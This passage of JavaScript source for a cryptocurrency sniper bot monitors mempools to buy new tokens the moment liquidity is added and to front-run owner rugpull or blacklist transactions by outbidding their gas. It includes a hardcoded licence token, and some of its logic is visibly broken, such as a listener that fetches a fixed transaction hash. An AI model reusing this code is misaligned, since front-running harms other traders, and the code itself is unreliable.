    if (transaction != null && rugpullDetected == false && blacklistDetected == false) {
      if (transaction.from.toLowerCase() == ownerWallet.toLowerCase()) {
        let match1 = transaction['data'].includes(token) && (transaction['data'].includes(removeLiquidity) || transaction['data'].includes(removeLiquidityETH) || transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) || transaction['data'].includes(removeLiquidityETHWithPermit) || transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) || transaction['data'].includes(removeLiquidityWithPermit));
        let match2 = transaction['data'].includes(functionToDetect)
        let filter = match1
        if (sellOnfunction) {
          filter = (match1) || (match2)
        }

        if (filter) {
          if (match2) {
            console.log("Function call method " + functionToDetect + " detected: https://" + chainScanner + "/tx/" + transaction.hash)
          } else {
            console.log("Remove Liquidity tx detected: https://" + chainScanner + "/tx/" + transaction.hash)
          }
          nrOfSellTransactions = 1;
          delaySell = 0;
          rugpullDetected = true;
          hasFound = transaction.hash;
          if (choseBlockChain == 1) {
            gasPriceSell = transaction.gasPrice.mul(2);
          } else {
            sellMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas.add(transaction.maxPriorityFeePerGas.div(4));
            sellMaxFeePerGas = transaction.maxFeePerGas.add(transaction.maxFeePerGas.div(4));
          }

          passed = 2;
          stopLoop = true;
          if (choseMethode == 3) {
            await sellFromContract();
            await new Promise(r => setTimeout(r, 500))
            process.exit(0)
          } else {
            await sellFromWallet();
            await new Promise(r => setTimeout(r, 500))
            process.exit(0)
          }

        } else if ((transaction['data'].includes(myAddress.toLowerCase().substring(2)) && transaction['to'].toLowerCase() == toContract) && stopLoop == false) {

          console.log("BlackList tx detected: https://" + chainScanner + "/tx/" + transaction.hash)
          nrOfSellTransactions = 1;
          delaySell = 0;
          blacklistDetected = true;
          hasFound = transaction.hash;
          if (choseBlockChain == 1) {
            gasPriceSell = transaction.gasPrice.mul(2);
          } else {
            sellMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas.add(transaction.maxPriorityFeePerGas.div(4));
            sellMaxFeePerGas = transaction.maxFeePerGas.add(transaction.maxFeePerGas.div(4));
          }
          passed = 2;
          stopLoop = true;
          if (choseMethode == 3) {
            await sellFromContract();
            await new Promise(r => setTimeout(r, 500))
            process.exit(0)
          } else {
            await sellFromWallet();
            await new Promise(r => setTimeout(r, 500))
            process.exit(0)
          }

        }
      }


      if (stopLoop == false) {

        if (sellAuto) {
          if (delaySell > 0) {
            if (startTimeStamp >= endTimeStamp) {
              passed = 2;
              stopLoop = true;
              if (choseMethode == 3) {
                await sellFromContract();
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)
              } else {
                await sellFromWallet();
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)
              }
            }
          } else {
            console.log('3198')
            passed = 2;
            stopLoop = true;
            if (choseMethode == 3) {
              await sellFromContract();
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            } else {
              await sellFromWallet();
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            }
          }
        } else {
          stopLoop = true;
          passed = 2
          tokenPriceStart = await getTokenPrice(tokenAddress, provider);
          if (snipeExactTokens) {
            startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
          } else {
            startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
          }
          await detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }
      }

    }


  })
}


function getHashForFunction(functionToDetect) {
  const iface = new ethers.utils.Interface([
    `function ${functionToDetect}`,
  ]);
  return iface.getSighash(functionToDetect);
}

async function startApprove() {
  currentNonce = await getNonce(myAddress);
  consoleLog(chalk.green('Start approving token...'))
  if (choseBlockChain == 3 || choseBlockChain == 2) {
    gasPriceApprove = await web3.eth.getGasPrice();
    gasPriceApprove = parseInt((gasPriceApprove / 1000000000).toFixed(0))
    gasPriceApprove = (gasPriceApprove * 1.20).toFixed(0)
    gasPriceApprove = ethers.utils.parseUnits(String(gasPriceApprove), 'gwei')
    gasLimitApprove = parseInt(500000);
    minGasPrice = ethers.utils.parseUnits('3', 'gwei');
  }
  try {
    if (choseBlockChain == 3) {
      gasLimitApprove = parseInt(2000000);
      try {
        const tx = await tokenContract.approve(
          routerAddress,
          ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
          { gasLimit: gasLimitApprove, maxFeePerGas: gasPriceApprove, maxPriorityFeePerGas: gasPriceApprove, nonce: currentNonce }
        )
        await tx.wait()
        currentNonce++
      } catch (e) {
        console.log(String(e))
        process.exit(0)
      }

    }
    if (choseBlockChain == 2) {

      gasLimitApprove = parseInt(500000);
      const tx = await tokenContract.approve(
        routerAddress,
        ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
        { gasLimit: gasLimitApprove, maxFeePerGas: gasPriceApprove, maxPriorityFeePerGas: minGasPrice, nonce: currentNonce }
      )
      await tx.wait()
      currentNonce++
    }
    if (choseBlockChain == 1) {
      const tx = await tokenContract.approve(
        routerAddress,
        ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
        { gasLimit: gasLimitApprove, gasPrice: gasPriceApprove, nonce: currentNonce++ }
      )
      await tx.wait()
    }

    // await tx.wait()
    consoleLog(chalk.green('Token spending approved. \n'))
  } catch (e) {
    currentNonce = await getNonce(myAddress);
    consoleLog(e)
    consoleLog(chalk.red(`Unable to confirm approval, please check bscscan!!! \n`))
  }
  currentNonce = await getNonce(myAddress);
}


async function getBlockDelay(recipt) {
  if(stopDuplicate == 0){
    consoleLog(chalk.red('Please wait to skip block ...'));
    stopDuplicate = 1;
  }

  for (i = 1; i > 0; i++) {
    hash = await provider.getTransactionReceipt(recipt)
    if (hash != null) {
      if (hash.status == 1) {
        startBlock = parseInt(hash.blockNumber);
        return startBlock;
      } else {
        if(stopDuplicate == 1){
        console.log('Liquidity failed to be added ... Waiting for liquidity to be added!');
        stopDuplicate = 2
      }
        passed = 0;
        hash = null;
        i = 0;
        return 0
      }
    }
  }
}

async function getAllTokenInfo(tokenAddress) {
  //get token Information:
  try {
    tokenDetails = await getMinTokenInfo(TokenContract, provider);
    passed = 1;
  } catch (e) {
    passed = 0;
  }

  if (passed == 1 && tokenDetails != null) {
    if (tokenDetails.decimals != 0) {
      var timestamp = Date.now()
      var date = new Date(timestamp);

      console.log('------------------------------------------------------------------');
      console.log('----DATE/TIME----> ' + +date.getDate() + "/" + (date.getMonth() + 1) + "/" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + ' <--------');
      console.log('New contract deployed: ' + TokenContract);
      console.log('Name: ' + tokenDetails.name);
      console.log('Symbol: ' + tokenDetails.symbol);
      console.log('Decimals: ' + tokenDetails.decimals);
      console.log('Total supply: ' + tokenDetails.totalSupply);

      //get owner wallet address:
      try {
        devWallet = await getDevAddresses(TokenContract, provider);
        await new Promise(r => setTimeout(r, (300)))
        if (devWallet != null) {
          console.log('Dev wallet: ' + devWallet.owner);
        } else {
          console.log('Token owner not found!');
        }
      } catch (e) {
        console.log('Token owner not found!');
      }
      console.log('------------------------------------------------------------------');

      passed = 0;
    }

  }
}

async function getReciptCtr(reciptHash) {
  try {
    receipt = await provider.getTransactionReceipt(reciptHash);
    for (wait = 0; wait < 1;) {
      receipt = await provider.getTransactionReceipt(reciptHash);
      if (receipt != null) {
        wait = 1;
        TokenContract = receipt.contractAddress;
        token = TokenContract.toLowerCase().substring(2);
        tokenAddress = '0x' + token;
        toContract = TokenContract.toLowerCase();
        await getAllTokenInfo(tokenAddress);
      }
    }
  } catch (e) {

  }
}

async function waitSnipeOnCall() {
  tokenInfoCall = new web3.eth.Contract(tokenInfoABI, TokenContract);
  tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
  tokenDecimals = tokenInfoDecimals;
  tokenInfoName = await tokenInfoCall.methods.name().call();
  tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
  totalInfoSupply = await tokenInfoCall.methods.totalSupply().call();
  Infosupply = ethers.BigNumber.from(totalInfoSupply);

  snipeNow = false;
  passed = 0;

  etherInfoCall = new web3.eth.Contract(tokenInfoABI, ETHER);
  etherInfoDecimals = await etherInfoCall.methods.decimals().call();
  etherDecimals = etherInfoDecimals;

  if (choseMethode == 1) {
    if (needApproval == true && approveBeforeOrAfter == 1) {
      await startApprove();
    }
  } else if (choseMethode == 2) {
    if (sendMultiWallet == 'true') {

    } else {
      if (needApproval == true && approveBeforeOrAfter == 1) {
        await startApprove();
      }
    }
  }

  await new Promise(r => setTimeout(r, 200));
  if (snipefunction == false) {
    consoleLog(chalk.green(`Connected to blockchain... \n`))
    consoleLog(chalk.green(`Sniper started with current settings:`))
    consoleLog(chalk.green('Buy token for ' + chalk.yellow(amountToBuyDisplay / 1000000000000000000) + ' ' + curency + ' using ' + chalk.yellow(gasLimit) + ' Gas and ' + chalk.yellow(process.env.buy_Gwei) + ' Gwei'))

    consoleLog(chalk.green(`Total ` + curency + ` balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, etherDecimals)).toFixed(6))}\n`))
    consoleLog(chalk.red('Current Nonce: ' + currentNonce));
    consoleLog(chalk.red('Scanning mempool for listing ...'));

    if (choseBlockChain == 1 || choseBlockChain == 4) {

      let tradingPair = await getPair(ETHER, TokenContract)
      if (tradingPair == null || tradingPair == '0x0000000000000000000000000000000000000000') {
        consoleLog(chalk.red('Warning!!! No trading pair detected...'));
      } else {
        consoleLog(chalk.red('Trading pair created at ' + tradingPair));
      }



      // liquidity detection system
      if (choseBlockChain == 1) {
        const deployerContract = new ethers.Contract(
          '0x7100c01f668a5B407dB6A77821DDB035561F25B8',
          [
            'function tokenAddrToOwnerAddr(address) view returns (address)',
            'function presales(address) view returns (bool exists, uint256 createdOn, address presaleInfoAddr, address tokenAddress, address presaleAddress, address governor, bool active, uint256 startTime, uint256 endTime, uint256 govPercentage, address uniswapDep, uint256 uniswapPercentage, uint256 uniswapRate, uint256 lp_locked)',
          ],
          provider
        );
        const dXtokenContract = new ethers.Contract(
          tokenAddress,
          [
            'function balanceOf(address _owner) view returns (uint256)',
          ],
          provider
        );
        const ownerAddress = await deployerContract.tokenAddrToOwnerAddr(tokenAddress);
        const presaleAddress = (await deployerContract.presales(ownerAddress)).presaleAddress;
      }


      let tokenBalanceInPresale = ethers.BigNumber.from('0');
      pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)

      if (buyOrSnipe == 1) {
        if (tradingPair == "0x0000000000000000000000000000000000000000") {
          tradingPair = await getPair(ETHER, TokenContract)
        } else {
          if (pairLiquidityValue.gt(zeroValueX)) {
            consoleLog(`Liquidity already present, stoping the process!`)
            consoleLog(`If you want to buy please restart MultiSniper Plus with the BUY option instead of SNIPE!`)
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }

        }
      } else {
        delayOnBuy = 0;
        snipeNow = true;
        passed = 1;
        consoleLog(chalk.red('Buying token ...'));

        await startSnipe();

      }
      if (snipeListingFromUnicrypt == true && choseBlockChain == 1) {
        let unicryptStartBlock = await getPresalInfoFromV6(ownerWallet, provider);
        consoleLog(chalk.red('Waiting for listing from unicrypt ...'));
        provider.on("pending", async (tx) => {
          const transaction = await provider.getTransaction('0x7acda03f28c58b58ea8e631c5084d952a7ebe816349364632b6c96bfb115011e')
          if (transaction != null && transaction.to != null && passed == 0) {

            if ((transaction.from.toLowerCase() == '0xe2aEfb9D145c6633fB019758d532C20B6c2577b2'.toLowerCase() && transaction.to.toLowerCase() == ownerWallet.toLowerCase() && transaction['data'].includes('0xe8078d94')) && passed == 0) {
              console.log("Liquidity tx: https://" + chainScanner + "/tx/" + transaction.hash)
              if (delayOnBuy > 1) {
                startBlock = await getBlockDelay(transaction.hash)
              } else if (delayOnBuy == 1) {
                await new Promise(r => setTimeout(r, 3000))
                startBlock = null;
              }
              consoleLog(chalk.red('Unicrypt Launch detected ...'));
              snipeNow = true;
              passed = 1;
              provider.removeAllListeners();
              if (snipeNow == true && passed == 1 && stopLoop == 0) {
                stopLoop = 1;
                consoleLog(chalk.red('Sniping ...'));
                await startSnipe();
              }

            }
          }

        });
      } else {
        if (presaleAddress && presaleAddress != '0x0000000000000000000000000000000000000000') {
          tokenBalanceInPresale = await dXtokenContract.balanceOf(presaleAddress);
        }
        if (presaleAddress && presaleAddress != '0x0000000000000000000000000000000000000000' && tokenBalanceInPresale.gt(ethers.BigNumber.from('0'))) {
          // dxsale detection mode
          let flag = true;
          consoleLog(`Listening on mempool for dxsale listings...`)
          consoleLog(`Waiting for liquidity to be added!`)
          provider.on("pending", async (txHash) => {
            const tx = await provider.getTransaction(txHash);
            if (flag && tx && tx.from == ownerAddress && tx.to == '0x7100c01f668a5B407dB6A77821DDB035561F25B8' && tx.data == '0x267dd102' && passed == 0) {
              flag = false;
              consoleLog(chalk.green(`Matching liquidity added! Start sniping!\n`))
              console.log("Liquidity tx: https://" + chainScanner + "/tx/" + tx.hash)
              if (delayOnBuy > 3) {
                startBlock = await getBlockDelay(transaction.hash)
              } else if (delayOnBuy < 4) {
                //await new Promise(r => setTimeout(r, 3000))
                startBlock = null;
              }

              if (autoGas) {
                if (tx.gasPrice.gte(ethers.utils.parseUnits('5', 'gwei'))) {
                  gasPrice = tx.gasPrice;
                  snipeNow = true;
                  passed = 1;
                  provider.removeAllListeners();
                  if (snipeNow == true && passed == 1 && stopLoop == 0) {
                    stopLoop = 1;
                    consoleLog(chalk.red('Sniping ...'));
                    await startSnipe();
                  }

                } else {
                  gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
                  buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
                  buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
                  snipeNow = true;
                  passed = 1;
                  provider.removeAllListeners();
                  if (snipeNow == true && passed == 1 && stopLoop == 0) {
                    stopLoop = 1;
                    consoleLog(chalk.red('Sniping ...'));
                    await startSnipe();
                  }
                }
              }
            }




          })
        } else {
          if (passed == 0) {
            consoleLog(`Listening on mempool for Fair Launch listings or other kind of listings`)
            consoleLog(`Waiting for liquidity to be added!`)
            provider.on("pending", async (tx) => {
              const transaction = await provider.getTransaction(tx);
              if (transaction != null && transaction.to != null && transaction['data'] != null && passed == 0) {
                condition1 = (transaction['data'].includes(addLiquidity) || transaction['data'].includes(addLiquidityETH)) && (transaction['data'].includes(token));
                condition2 = (transaction.from.toLowerCase() == ownerWallet.toLowerCase()) && (transaction['data'].includes('0x4bb278f3') || transaction['data'].includes('0x26e353b8') || transaction['data'].includes('0xfb201b1d'));

                if ((condition1) || (condition2)) {
                  if (condition1) {
                    consoleLog(chalk.red('Fair Launch detected ...'));
                  }
                  if (condition2) {
                    consoleLog(chalk.red('PinkSale Launch detected ...'));
                  }
                  console.log("Liquidity tx: https://" + chainScanner + "/tx/" + transaction.hash)
                  if (delayOnBuy > 3) {
                    startBlock = await getBlockDelay(transaction.hash)
                  } else if (delayOnBuy < 4) {
                    //await new Promise(r => setTimeout(r, 3000))
                    startBlock = null;
                  }
                  gasPrice = transaction.gasPrice;
                  snipeNow = true;
                  passed = 1;
                  provider.removeAllListeners();
                  if (snipeNow == true && passed == 1 && stopLoop == 0) {
                    stopLoop = 1;
                    consoleLog(chalk.red('Sniping ...'));
                    await startSnipe();
                  }
                } else {
                  if (transaction != null && passed == 0 && tradingPair != "0x0000000000000000000000000000000000000000") {
                    pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)
                    if (pairLiquidityValue.gt(zeroValueX)) {
                      if (stopText == 0) {
                        consoleLog(chalk.red('Deployment from smart contract detected .....'));
                      }
                      stopText = 1;

                      if (delayOnBuy > 3) {
                        startBlock = await getBlockDelay(transaction.hash)
                      } else if (delayOnBuy < 4) {
                       // await new Promise(r => setTimeout(r, 3000))
                        startBlock = null;
                      }
                      snipeNow = true;
                      passed = 1;
                      provider.removeAllListeners();
                      if (snipeNow == true && passed == 1 && stopLoop == 0) {
                        stopLoop = 1;
                        consoleLog(chalk.red('Sniping ...'));
                        await startSnipe();
                      }

                    } else {
                      tradingPair = await getPair(ETHER, TokenContract)
                    }
                  }
                }
              }
            });

          }

        }
      }


    } else if (choseBlockChain == 2) {
      let tradingPair = await getPair(ETHER, TokenContract)
      if (tradingPair == null || tradingPair == '0x0000000000000000000000000000000000000000') {
        consoleLog(chalk.red('Warning!!! No trading pair detected...'));
      } else {
        consoleLog(chalk.red('Trading pair created at ' + tradingPair));
      }


      pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)
      if (buyOrSnipe == 1 && tradingPair != "0x0000000000000000000000000000000000000000") {
        if (pairLiquidityValue.gt(zeroValueX)) {
          consoleLog(`Liquidity already present, stoping the process!`)
          consoleLog(`If you want to buy please restart MultiSniper Plus with the BUY option instead of SNIPE!`)
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
      } else {
        if (buyOrSnipe == 2) {
          tradingPair = await getPair(ETHER, TokenContract)
          delayOnBuy = 0;
          snipeNow = true;
          passed = 1;
          consoleLog(chalk.red('Buying token ...'));
          await startSnipe();
        }

      }

      consoleLog(`Listening on mempool for Fair Launch listings or other kind of listings`)
      consoleLog(`Waiting for liquidity to be added!`)
      provider.on("pending", async (tx) => {
        const transaction = await provider.getTransaction(tx)
        if (transaction != null && transaction.to != null && passed == 0) {
          condition1 = (transaction['data'].includes(MethodID1) || transaction['data'].includes(MethodID2) || transaction['data'].includes(MethodID3) || transaction['data'].includes(MethodID4)) && transaction['data'].includes(token);
          condition2 = routerAddress.toLowerCase() == transaction.to.toLowerCase();
          if (condition2 && condition1) {
            consoleLog(chalk.red('Fair Launch detected ...'));
            console.log("Liquidity tx: https://" + chainScanner + "/tx/" + transaction.hash)
            if (delayOnBuy > 0) {
              startBlock = await getBlockDelay(transaction.hash)
            } 
            buyMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas;
            buyMaxFeePerGas = transaction.maxFeePerGas;
            snipeNow = true;
            passed = 1;
            provider.removeAllListeners();
            if (snipeNow == true && passed == 1 && stopLoop == 0) {
              stopLoop = 1;
              consoleLog(chalk.red('Sniping ...'));
              await startSnipe();
            }

          } else {
            if (transaction != null && passed == 0 && tradingPair != "0x0000000000000000000000000000000000000000") {
              pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)
              if (pairLiquidityValue.gt(zeroValueX)) {
                if (stopText == 0) {
                  consoleLog(chalk.red('Deployment from smart contract detected .....'));
                }
                stopText = 1;
                if (delayOnBuy > 0) {
                  startBlock = await getBlockDelay(transaction.hash)
                }
                snipeNow = true;
                passed = 1;
                provider.removeAllListeners();
                if (snipeNow == true && passed == 1 && stopLoop == 0) {
                  stopLoop = 1;
                  consoleLog(chalk.red('Sniping ...'));
                  await startSnipe();
                }

              } else {
                tradingPair = await getPair(ETHER, TokenContract)
              }
            }
          }
        }
      });


    } else if (choseBlockChain == 3) {
      let tradingPair = await getPair(ETHER, TokenContract)
      if (tradingPair == null || tradingPair == '0x0000000000000000000000000000000000000000') {
        consoleLog(chalk.red('Warning!!! No trading pair detected...'));
      } else {
        consoleLog(chalk.red('Trading pair created at ' + tradingPair));
      }
      exchangeToken = 1;
      choseMarket = 1;

      pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)
      if (buyOrSnipe == 1) {
        if (tradingPair == "0x0000000000000000000000000000000000000000") {
          tradingPair = await getPair(ETHER, TokenContract)
        } else {
          console.log(pairLiquidityValue)
          if (pairLiquidityValue.gt(zeroValueX)) {
            consoleLog(`Liquidity already present, stoping the process!`)
            consoleLog(`If you want to buy please restart MultiSniper Plus with the BUY option instead of SNIPE!`)
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
        }
      } else {
        delayOnBuy = 0;
        snipeNow = true;
        passed = 1;
        consoleLog(chalk.red('Buying token ...'));
        await startSnipe();
        //process.exit(0)

      }

      consoleLog(`Listening on mempool for Fair Launch listings or other kind of listings`)
      consoleLog(`Waiting for liquidity to be added!`)
      provider.on("pending", async (tx) => {
        const transaction = await provider.getTransaction(tx)
        if (transaction != null && transaction.to != null && passed == 0) {
          condition1 = (transaction['data'].includes(addLiquidity) || transaction['data'].includes(addLiquidityETH)) && transaction['data'].includes(token);
          contition2 = '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff'.toLowerCase() == transaction.to.toLowerCase();
          if (contition2 && condition1) {
            consoleLog(chalk.red('Fair Launch detected ...'));
            console.log("Liquidity tx: https://" + chainScanner + "/tx/" + transaction.hash)
            if (delayOnBuy > 1) {
              startBlock = await getBlockDelay(transaction.hash)
            } else if (delayOnBuy == 1) {
              await new Promise(r => setTimeout(r, 6000))
              startBlock = null;
            }
            buyMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas;
            buyMaxFeePerGas = transaction.maxFeePerGas;
            snipeNow = true;
            passed = 1;
            provider.removeAllListeners();
            if (snipeNow == true && passed == 1 && stopLoop == 0) {
              stopLoop = 1;
              consoleLog(chalk.red('Sniping ...'));
              await startSnipe();
            }
          } else {
            if (transaction != null && passed == 0 && tradingPair != "0x0000000000000000000000000000000000000000") {
              pairLiquidityValue = await getTokenBalance(ETHER, tradingPair, provider)
              if (pairLiquidityValue.gt(zeroValueX)) {
                if (stopText == 0) {
                  consoleLog(chalk.red('Deployment from smart contract detected .....'));
                }
                stopText = 1;
                if (delayOnBuy > 1) {
                  startBlock = await getBlockDelay(transaction.hash)
                } else if (delayOnBuy == 1) {
                  await new Promise(r => setTimeout(r, 6000))
                  startBlock = null;
                }
                snipeNow = true;
                passed = 1;
                provider.removeAllListeners();
                if (snipeNow == true && passed == 1 && stopLoop == 0) {
                  stopLoop = 1;
                  consoleLog(chalk.red('Sniping ...'));
                  await startSnipe();
                }
              } else {
                tradingPair = await getPair(ETHER, TokenContract)
              }
            }
          }

        }

      });


    }
  } else {
    etherInfoCall = new web3.eth.Contract(tokenInfoABI, ETHER);
    etherInfoDecimals = await etherInfoCall.methods.decimals().call();
    etherDecimals = etherInfoDecimals;
    consoleLog(chalk.green(`Connected to blockchain... \n`))
    consoleLog(chalk.green(`Sniper started with current settings:`))
    consoleLog(chalk.green('Buy token for ' + chalk.yellow(amountToBuyDisplay / 1000000000000000000) + ' ' + curency + ' using ' + chalk.yellow(gasLimit) + ' Gas and ' + chalk.yellow(process.env.buy_Gwei) + ' Gwei'))
    consoleLog(chalk.green(`Total ` + curency + ` balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, etherDecimals)).toFixed(6))}\n`))
    consoleLog(chalk.red('Current Nonce: ' + currentNonce));

    await new Promise(r => setTimeout(r, 200));
    if (openTrade.includes('0x')) {
      //console.log('its hashed!')
      functionToDetect = openTrade;
    } else {
      functionToDetect = getHashForFunction(openTrade);
      // console.log(functionToDetect);
    }
    console.log('Target contract address: ' + toContract);
    console.log('Hash of function to detect: ' + functionToDetect);
    consoleLog(chalk.red('Scanning mempool ...'));

    provider.on("pending", async (tx) => {
      const transaction = await provider.getTransaction(tx)
      if (transaction != null && transaction.to != null && passed == 0) {
        conditionA = (TokenContract.toLowerCase() == transaction.to.toLowerCase() && (transaction['data'].includes(functionToDetect)));
        conditionB = transaction['from'].toLowerCase() == ownerWallet.toLowerCase();
        if (conditionA && conditionB) {
          if (choseBlockChain == 1) {
            gasPrice = transaction.gasPrice;
          } else {
            buyMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas;
            buyMaxFeePerGas = transaction.maxFeePerGas;
          }
          consoleLog(chalk.red('FunctionCall detected ...'));
          console.log('Function tx hash https://' + chainScanner + '/tx/' + transaction.hash)
         
            if (delayOnBuy > 3) {
              startBlock = await getBlockDelay(transaction.hash)
            } else if( delayOnBuy > 0 && delayOnBuy < 4) {
              if (choseBlockChain == 1) {
                consoleLog(chalk.red('Please wait to skip block ...'));
                gasPrice = transaction.gasPrice;
                startBlock = null;
               // await new Promise(r => setTimeout(r, 3000))
              } else if (choseBlockChain == 2) {
                startBlock = await getBlockDelay(transaction.hash)
                consoleLog(chalk.red('Please wait to skip block ...'));
                buyMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas;
                buyMaxFeePerGas = transaction.maxFeePerGas;
               // await new Promise(r => setTimeout(r, 16000))
              } else if (choseBlockChain == 3) {
                startBlock = await getBlockDelay(transaction.hash)
                consoleLog(chalk.red('Please wait to skip block ...'));
                buyMaxPriorityFeePerGas = transaction.maxPriorityFeePerGas;
                buyMaxFeePerGas = transaction.maxFeePerGas;
               // await new Promise(r => setTimeout(r, 6000))
              }
              
            }
       

          snipeNow = true;
          passed = 1;
          provider.removeAllListeners();
          if (snipeNow == true && passed == 1 && stopLoop == 0) {
            stopLoop = 1;
            consoleLog(chalk.red('Sniping ...'));
            await startSnipe();
          }


        }
      }

    });
  }
}

function getFunctionBody(start, end) {

  let body = '';

  for (i = start - 1; i < end; i++) {
    body += contractLineByLine[i];
  }

  return body;
}

function getFunctionLine(start) {

  var str = contractLineByLine[start - 1];
  var newstr = str.substring(str.indexOf("("), str.indexOf(")") + 1);

  return newstr;
};

//Checking for contract address
function check_contract_address(text) {
  const pattern = text.search(/\b0[xX][0-9a-fA-F]{40}\b/);
  if (pattern != -1)
    return text.substring(pattern, pattern + 42);

  return false;
};

function check_for_bad_contracts(text) {
  const patternContract = text.search(/\b0[xX][\S]{40,}\b/)
  if (patternContract != -1)
    return text.substring(patternContract).split(" ")[0];

  return false;
}

async function checkForKeyWords(functionsDetected) {

  //console.log(functionsDetected.length);
  //console.log(token_functions_result.length);
  let functionDetectedInContract = null;
  let categoryOfFunctionDetectedInContract = null;

  let obj = {}
  token_functions_result.forEach(element => {
    functionDetectedInContract = null;
    categoryOfFunctionDetectedInContract = null;
    //console.log(element);

    for (j = 0; j < functionsDetected.length; j++) {

      let keyword_low = (element.keyword) ? element.keyword.toLowerCase() : null
      let function_low = (element.function) ? element.function.toLowerCase() : null
      let fd_name_low = (functionsDetected[j].line) ? functionsDetected[j].line.toLowerCase() : "()"
      let fd_body_low = functionsDetected[j].body.toLowerCase()

      //if function is set, check only in function name
      if (fd_name_low.includes(function_low) && (element.function !== null)) {
        categoryOfFunctionDetectedInContract = element.category;

        if (obj.hasOwnProperty(element.category)) obj[element.category] = obj[element.category] + 1;
        else obj[element.category] = 1;
        functionDetectedInContract = functionsDetected[j].line;

        //console.log("Detected Function: " + functionsDetected[j].line)
        //console.log(element.category);
      }

      //if keyword is set, check only in body
      if (fd_body_low.includes(keyword_low) && (element.keyword !== null)) {
        if (obj.hasOwnProperty(element.category)) obj[element.category] = obj[element.category] + 1;
        else obj[element.category] = 1;
        //console.log("function body: " + functionsDetected[j].line + " include " + keyword_low)
        //console.log(element.category);
      }

    }
    if (functionDetectedInContract) {
      functionsScanned.push({ 'function': functionDetectedInContract, 'category': categoryOfFunctionDetectedInContract, 'description': element.description });
    }


  });


  if (obj.scammer > 0) {
    scam = "Yes";
  }
  if (obj.rugpull > 0) {
    rug = "Yes";
  }

  if (obj.antibot > 0) {
    bot = "Yes";
  }
  console.log(obj)



}

function startReady() {
  choseBlockChain = process.env.choseBlockChain;
  multiWallets = process.env.multiWallets;
  authToken = 'F4077ED6551D631B2C9D4F3C045B3B5E';


  if (choseMethode == 2 || choseMethode == 3) {
    contractAddon = true;
  } else {
    contractAddon = false;
  }

  let params = new URLSearchParams();
  params.append('token', authToken);
  axios.post('https://multi-sniper.com/plusLicenseCheck.php', params).then(function (response) {
    // console.log(response.data)
    if (response.data.success) {
      if (choseBlockChain == 1 && response.data.reqIp != response.data.ip) {
        consoleLog(chalk.magenta("Your MultiSniper Plus is not allowed on this blockchain or your not licensed to use this software, please contact us on discord: https://discord.gg/4qpbk4Jp or on telegram: https://t.me/multisniperbots"));
        consoleLog(chalk.magenta("You will also get this message if your trying to access the Contract Addon ilegally"));
        consoleLog(chalk.magenta("Oficial version can only be bought from https://multisniperbot.com"));
        (async () => {
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        })();
      }
      if (choseBlockChain == 2 && response.data.reqIp != response.data.ip_eth) {
        consoleLog(chalk.magenta("Your MultiSniper Plus is not allowed on this blockchain or your not licensed to use this software, please contact us on discord: https://discord.gg/4qpbk4Jp or on telegram: https://t.me/multisniperbots"));
        consoleLog(chalk.magenta("You will also get this message if your trying to access the Contract Addon ilegally"));
        consoleLog(chalk.magenta("Oficial version can only be bought from https://multisniperbot.com"));
        (async () => {
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        })();
      }

      if ((choseBlockChain == 3 || choseBlockChain == 4) && response.data.reqIp != response.data.ip_polygon) {
        consoleLog(chalk.magenta("Your MultiSniper Plus is not allowed on this blockchain or your not licensed to use this software, please contact us on discord: https://discord.gg/4qpbk4Jp or on telegram: https://t.me/multisniperbots"));
        consoleLog(chalk.magenta("You will also get this message if your trying to access the Contract Addon ilegally"));
        consoleLog(chalk.magenta("Oficial version can only be bought from https://multisniperbot.com"));
        (async () => {
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        })();
      }
      if (parseInt(response.data.ctr) == 1) {
        paymentForScan = false;
      }
      if (contractAddon == true && parseInt(response.data.ctr) == 1) {
        walletAllowed = 15;
      } else if (contractAddon == false) {
        walletAllowed = parseInt(response.data.wallets);
      } else {
        consoleLog(chalk.magenta("Your MultiSniper Plus is not allowed on this blockchain or your not licensed to use this software, please contact us on discord: https://discord.gg/4qpbk4Jp or on telegram: https://t.me/multisniperbots"));
        consoleLog(chalk.magenta("You will also get this message if your trying to access the Contract Addon ilegally"));
